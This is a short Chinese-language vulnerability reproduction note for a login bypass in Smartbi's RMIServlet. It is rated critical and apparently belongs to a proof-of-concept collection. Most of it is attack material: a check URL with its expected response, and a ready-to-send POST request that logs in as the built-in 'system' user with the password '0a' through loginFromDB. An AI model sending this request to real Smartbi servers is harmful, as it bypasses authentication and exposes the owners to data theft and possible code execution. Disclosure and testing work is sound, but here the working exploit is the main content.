# Smartbi RMIServlet 登陆绕过漏洞

## 漏洞描述
该漏洞源于 Smartbi 默认存在内置用户，在使用特定接口时，攻击者可绕过用户身份认证机制获取内置用户身份凭证，随后可使用获取的身份凭证调用后台接口，最终可能导致敏感信息泄露和代码执行。

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
验证漏洞是否存在

```
http://your-ip/smartbi/vision/RMIServlet
```

出现以下回显证明漏洞存在

```
{"retCode":"CLIENT_USER_NOT_LOGIN","result":"尚未登录或会话过期"}

## Payloads
```
http://your-ip/smartbi/vision/RMIServlet
```
```
{"retCode":"CLIENT_USER_NOT_LOGIN","result":"尚未登录或会话过期"}
```
```
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: your-ip
Content-Type: application/x-www-form-urlencoded
 
className=UserService&methodName=loginFromDB&params=["system","0a"]
```
